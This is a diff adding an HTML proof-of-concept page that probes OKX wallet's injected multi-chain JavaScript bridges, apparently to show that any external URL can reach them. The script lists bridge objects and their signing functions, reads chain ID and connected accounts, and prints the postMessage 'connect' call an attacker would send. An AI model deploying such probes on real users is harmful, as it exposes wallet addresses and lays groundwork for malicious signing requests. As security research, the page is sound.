@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OKX_AUTOPROBE</title>
+<style>
+body{font-family:monospace;font-size:11px;padding:4px;background:#fff;color:#000}
+h2{font-size:14px;margin:6px 0}
+h3{font-size:12px;margin:4px 0;background:#ff0;padding:2px}
+pre{background:#eee;padding:3px;font-size:9px;white-space:pre-wrap;word-break:break-all;margin:2px 0}
+.g{color:green;font-weight:bold}.r{color:red;font-weight:bold}
+</style></head><body>
+<h2>OKX Multi-Chain Bridge Auto-Probe</h2>
+<div id="env"></div>
+<div id="out">running...</div>
+<script>
+function log(html){ document.getElementById("out").innerHTML += html; }
+document.getElementById("env").innerHTML = "<p>UA: "+navigator.userAgent+"</p><p>URL: "+location.href+"</p>";
+async function run(){
+  document.getElementById("out").innerHTML = "";
+  var bridges = ["_solana_","_aptos_","_okx_sui_","tron","native",
+    "okxInternalJSBridge","okxOsmosJSBridge","okxStarkJSBridge",
+    "okxBtcJSBridge","okxNostrJSBridge","okxTonJSBridge",
+    "okxwallet","ethereum","solana","tronWeb","aptos","sui","ton","starknet"];
+
+  bridges.forEach(function(b){
+    var v = window[b];
+    if(!v){ log("<p><span class=r>[ABSENT]</span> "+b+"</p>"); return; }
+    var keys=[]; try{for(var k in v) keys.push(k);}catch(e){}
+    var protoKeys=[]; try{protoKeys=Object.getOwnPropertyNames(Object.getPrototypeOf(v)||{});}catch(e){}
+    var fns=[]; ["postMessage","request","send","sendAsync","enable","connect","disconnect","signTransaction","signMessage","sendTransaction","sign","signAllTransactions","approve","openLink"].forEach(function(m){
+      if(typeof v[m]==="function") fns.push(m);
+    });
+    log("<h3 class=g>["+b+"] PRESENT</h3>");
+    log("<pre>own keys: "+keys.slice(0,30).join(", ")+"</pre>");
+    log("<pre>proto: "+protoKeys.slice(0,30).join(", ")+"</pre>");
+    log("<pre>callable fns: <span class=g>"+fns.join(", ")+"</span></pre>");
+  });
+
+  // Try a passive eth_accounts read (no signing)
+  log("<h3>EIP-1193 passive read</h3>");
+  var p = window.ethereum || window.okxwallet;
+  if(p){
+    log("<pre>provider: ethereum/okxwallet present, isOkxWallet="+p.isOkxWallet+", isMetaMask="+p.isMetaMask+"</pre>");
+    try{
+      var ca = await p.request({method:"eth_chainId"});
+      log("<pre class=g>eth_chainId: "+ca+"</pre>");
+    }catch(e){ log("<pre class=r>eth_chainId ERR: "+e.message+"</pre>"); }
+    try{
+      var acc = await p.request({method:"eth_accounts"});
+      log("<pre class=g>eth_accounts: "+JSON.stringify(acc)+"</pre>");
+    }catch(e){ log("<pre class=r>eth_accounts ERR: "+e.message+"</pre>"); }
+    try{
+      var ver = await p.request({method:"web3_clientVersion"});
+      log("<pre class=g>web3_clientVersion: "+ver+"</pre>");
+    }catch(e){ log("<pre class=r>web3_clientVersion ERR: "+e.message+"</pre>"); }
+  } else {
+    log("<pre class=r>no ethereum provider</pre>");
+  }
+
+  // Try _solana_.postMessage with a 'connect' probe (won't sign, may prompt)
+  log("<h3>Solana _solana_.postMessage probe</h3>");
+  var s = window._solana_ || window.solana;
+  if(s && typeof s.postMessage === "function"){
+    log("<pre class=g>_solana_.postMessage IS callable function</pre>");
+    log("<pre>NOTE: Real attacker would call: s.postMessage(JSON.stringify({id:1,name:'connect',object:{},dappName:'evil',chainId:0}))</pre>");
+  } else {
+    log("<pre class=r>_solana_ missing or postMessage absent</pre>");
+  }
+  log("<h3>DONE</h3><pre>If you can read this, an arbitrary external URL got full multi-chain wallet bridge access.</pre>");
+}
+run();
+</script></body></html>
